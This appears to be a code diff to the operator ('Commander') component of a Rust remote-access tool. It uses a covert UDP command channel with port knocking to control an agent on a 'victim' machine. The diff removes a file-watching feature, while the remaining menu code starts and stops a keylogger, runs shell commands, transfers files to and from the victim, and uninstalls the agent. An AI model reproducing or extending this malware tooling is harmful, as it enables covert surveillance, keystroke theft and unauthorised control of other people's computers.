@@ -4,7 +4,7 @@
 /// - Menu-driven state machine (Disconnected/Connected)
 /// - Port knock initiation via port_knkr module
 /// - Covert UDP channel for C2 commands
-/// - Keylogger control, shell execution, file transfer, file watching
+/// - Keylogger control, shell execution, file transfer
 ///
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
@@ -29,10 +29,8 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
-             PACKET_TYPE_WATCH_DATA, PACKET_TYPE_WATCH_DELETED,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
-             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL,
-             CTRL_WATCH_FILE, CTRL_STOP_WATCH};
+             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
 // Configuration
 const BUFFER_SIZE: usize = 4096;
@@ -58,7 +56,6 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
-    watched_file_path: Option<String>,
 }
 
 impl Commander {
@@ -74,7 +71,6 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
-            watched_file_path: None,
         }
     }
 
@@ -125,10 +121,8 @@ impl Commander {
         println!("4) Run Shell Command");
         println!("5) Transfer File to Victim");
         println!("6) Transfer File from Victim");
-        println!("7) Watch File for Changes");
-        println!("8) Stop Watching File");
-        println!("9) Uninstall Agent");
-        println!("10) Disconnect");
+        println!("7) Uninstall Agent");
+        println!("8) Disconnect");
         println!("0) Exit Commander");
         
         match prompt("Selection > ").as_str() {
@@ -138,10 +132,8 @@ impl Commander {
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.watch_file(),
-            "8" => self.stop_watch(),
-            "9" => self.uninstall(),
-            "10" => self.disconnect(),
+            "7" => self.uninstall(),
+            "8" => self.disconnect(),
             "0" => {
                 self.running.store(false, Ordering::SeqCst);
             },
@@ -300,54 +292,6 @@ impl Commander {
                                     .extend_from_slice(payload);
                             }
                         }
-                        PACKET_TYPE_WATCH_DATA => {
-                            if let Some(ip) = self.victim_ip {
-                                if let Some(filename) = &self.watched_file_path {
-                                    println!("\n[FILE WATCH] File changed!");
-                                    
-                                    let _ = std::fs::create_dir_all("watched");
-                                    let watch_path = format!("watched/{}", filename);
-                                    
-                                    if let Ok(mut f) = std::fs::File::create(&watch_path) {
-                                        use std::io::Write;
-                                        let _ = f.write_all(payload);
-                                        println!("[FILE WATCH] Saved to {}", watch_path);
-                                    }
-                                }
-                            }
-                        }
-                        PACKET_TYPE_WATCH_DELETED => {
-                            if let Some(ip) = self.victim_ip {
-                                println!("\n[FILE WATCH] File deleted on victim!");
-                                
-                                let _ = std::fs::create_dir_all("watched/deleted");
-                                
-                                let timestamp = std::time::SystemTime::now()
-                                    .duration_since(std::time::UNIX_EPOCH)
-                                    .unwrap()
-                                    .as_secs();
-                                
-                                if let Some(filename) = &self.watched_file_path {
-                                    let deleted_path = format!("watched/deleted/{}_{}", timestamp, filename);
-                                    
-                                    if let Some(data) = self.keylog_buffer.get(&ip) {
-                                        if !data.is_empty() {
-                                            if let Ok(mut f) = std::fs::File::create(&deleted_path) {
-                                                use std::io::Write;
-                                                let _ = f.write_all(data);
-                                                println!("[FILE WATCH] Last content saved to {}", deleted_path);
-                                            }
-                                        } else {
-                                            if let Ok(mut f) = std::fs::File::create(&deleted_path) {
-                                                use std::io::Write;
-                                                let _ = f.write_all(b"[File deleted before content captured]");
-                                            }
-                                            println!("[FILE WATCH] Deletion recorded: {}", deleted_path);
-                                        }
-                                    }
-                                }
-                            }
-                        }
                         PACKET_TYPE_HEARTBEAT => {
                             let ack = PacketHeader::new_ack(header.message_id);
                             let mut ack_buf = [0u8; HEADER_SIZE];
@@ -448,11 +392,13 @@ impl Commander {
             }
         };
 
+        // Build metadata: path_len + path + file_size
         let mut metadata = Vec::new();
         metadata.push(remote_path.as_bytes().len() as u8);
         metadata.extend_from_slice(remote_path.as_bytes());
         metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
         
+        // Send as PACKET_TYPE_FILE (not CMD)
         if self.send_packet(PACKET_TYPE_FILE, 0, &metadata).is_err() {
             println!("[!] Failed to send metadata");
             return;
@@ -531,45 +477,6 @@ impl Commander {
         }
     }
 
-    fn watch_file(&mut self) {
-        let file_path = prompt("File path to watch: ");
-        
-        if file_path.is_empty() {
-            println!("[!] Invalid path");
-            return;
-        }
-
-        let filename = std::path::Path::new(&file_path)
-            .file_name()
-            .and_then(|n| n.to_str())
-            .unwrap_or("unknown_file");
-        
-        self.watched_file_path = Some(filename.to_string());
-
-        println!("[*] Starting file watch on: {}", file_path);
-        
-        let mut request = Vec::new();
-        request.push(file_path.as_bytes().len() as u8);
-        request.extend_from_slice(file_path.as_bytes());
-        
-        if self.send_packet(PACKET_TYPE_CTRL, CTRL_WATCH_FILE, &request).is_err() {
-            println!("[!] Failed to send watch request");
-            return;
-        }
-        
-        let _ = std::fs::create_dir_all("watched");
-        
-        println!("[+] File watch started. Changes saved to watched/{}", filename);
-        println!("[*] If file is deleted, it will be moved to watched/deleted/");
-    }
-
-    fn stop_watch(&mut self) {
-        println!("[*] Stopping file watch...");
-        self.send_control(CTRL_STOP_WATCH);
-        println!("[+] File watch stopped");
-        self.watched_file_path = None;
-    }
-
     fn uninstall(&mut self) {
         println!("Uninstalling agent from victim...");
         if prompt("Confirm uninstall? (yes/no) > ").to_lowercase() == "yes" {
@@ -595,7 +502,6 @@ impl Commander {
         self.knock_session = None;
         self.pending_commands.clear();
         self.keylog_buffer.clear();
-        self.watched_file_path = None;
         
         println!("[+] Disconnected");
     }
